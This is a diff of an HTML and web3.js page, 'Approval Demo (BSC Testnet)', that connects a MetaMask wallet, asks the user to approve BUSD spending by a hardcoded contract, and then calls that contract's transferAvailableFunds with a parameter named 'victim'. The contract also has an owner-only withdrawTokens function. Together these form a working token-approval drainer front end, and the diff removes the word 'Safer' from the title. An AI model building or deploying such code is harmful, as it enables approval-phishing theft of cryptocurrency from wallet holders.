@@ -1,67 +1,108 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Safer Approval Demo</title>
+    <title>Approval Demo</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
     <style>
-        /* ... (keep previous styles) ... */
-        input { padding: 8px; margin: 5px; width: 100px; }
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+        button { padding: 10px; margin: 5px; cursor: pointer; background: #f0f0f0; border: 1px solid #ccc; }
+        #walletInfo { display: none; margin-top: 20px; padding: 15px; border: 1px solid #eee; }
+        #status { margin-top: 10px; padding: 10px; background: #f8f8f8; }
+        input { padding: 8px; width: 100px; }
     </style>
 </head>
 <body>
-    <h1>Safer Approval Demo (BSC Testnet)</h1>
-    
+    <h1>Approval Demo (BSC Testnet)</h1>
     <button id="connectWallet">Connect Wallet</button>
     
-    <div id="walletInfo" style="display:none;">
+    <div id="walletInfo">
         <p>Connected: <strong id="walletAddress"></strong></p>
-        
         <div>
-            <label>BUSD Amount: </label>
-            <input type="number" id="amountInput" placeholder="10" step="0.1">
-            <button id="requestApproval">Approve BUSD</button>
+            <input type="number" id="amountInput" placeholder="10" step="0.1"> BUSD
+            <button id="requestApproval">Approve</button>
         </div>
-        
-        <button id="transferFunds">Transfer Available Funds</button>
+        <button id="transferFunds">Transfer Funds</button>
         <div id="status"></div>
     </div>
 
     <script>
-        // Contracts (BSC Testnet)
+        // Contract details
         const BUSD_ADDRESS = "0x8301F2213c0eeD49a7E28Ae4c3e91722919B8B47";
-        const CONTRACT_ADDRESS = "0x7525ac8400b9340852b2703db570ee3c28cedf08"; // Replace me!
+        const CONTRACT_ADDRESS = "0xe13a0fc939a16315fb9de42200123989642f4946";
         
+        // Contract ABI (MUST match your deployed contract)
+        const CONTRACT_ABI = [
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "token",
+                "outputs": [{"internalType": "contract IERC20", "name": "", "type": "address"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
+                "name": "requestApproval",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "address", "name": "victim", "type": "address"}],
+                "name": "transferAvailableFunds",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+
         let web3;
         let accounts = [];
         let contract;
 
-        // Initialize
-        async function init() {
+        // Connect wallet
+        document.getElementById('connectWallet').onclick = async () => {
             if (window.ethereum) {
                 try {
                     accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     web3 = new Web3(window.ethereum);
                     
-                    // Load contract ABI
-                    const contractABI = [ /* Paste your contract ABI here */ ];
-                    contract = new web3.eth.Contract(contractABI, CONTRACT_ADDRESS);
+                    // Initialize contract
+                    contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                     
                     document.getElementById('walletAddress').textContent = accounts[0];
                     document.getElementById('walletInfo').style.display = 'block';
                     updateStatus("Connected to BSC Testnet");
-                    
                 } catch (error) {
                     updateStatus(`Error: ${error.message}`);
                 }
             } else {
                 updateStatus("Please install MetaMask!");
             }
-        }
+        };
 
-        // Approve specific amount
-        async function approveBUSD() {
+        // Approve BUSD
+        document.getElementById('requestApproval').onclick = async () => {
             const amount = document.getElementById('amountInput').value;
-            if (!amount || amount <= 0) {
+            if (!amount || isNaN(amount)) {
                 updateStatus("Please enter a valid amount");
                 return;
             }
@@ -73,27 +114,22 @@
             } catch (error) {
                 updateStatus(`Approval failed: ${error.message}`);
             }
-        }
+        };
 
-        // Transfer available funds
-        async function transferFunds() {
+        // Transfer funds
+        document.getElementById('transferFunds').onclick = async () => {
             try {
                 const tx = await contract.methods.transferAvailableFunds(accounts[0])
                     .send({ from: accounts[0] });
-                updateStatus(`Transferred available funds. TX: <a href="https://testnet.bscscan.com/tx/${tx.transactionHash}" target="_blank">View</a>`);
+                updateStatus(`Funds transferred. TX: <a href="https://testnet.bscscan.com/tx/${tx.transactionHash}" target="_blank">View</a>`);
             } catch (error) {
                 updateStatus(`Transfer failed: ${error.message}`);
             }
-        }
+        };
 
         function updateStatus(message) {
             document.getElementById('status').innerHTML = message;
         }
-
-        // Event listeners
-        document.getElementById('connectWallet').addEventListener('click', init);
-        document.getElementById('requestApproval').addEventListener('click', approveBUSD);
-        document.getElementById('transferFunds').addEventListener('click', transferFunds);
     </script>
 </body>
 </html>
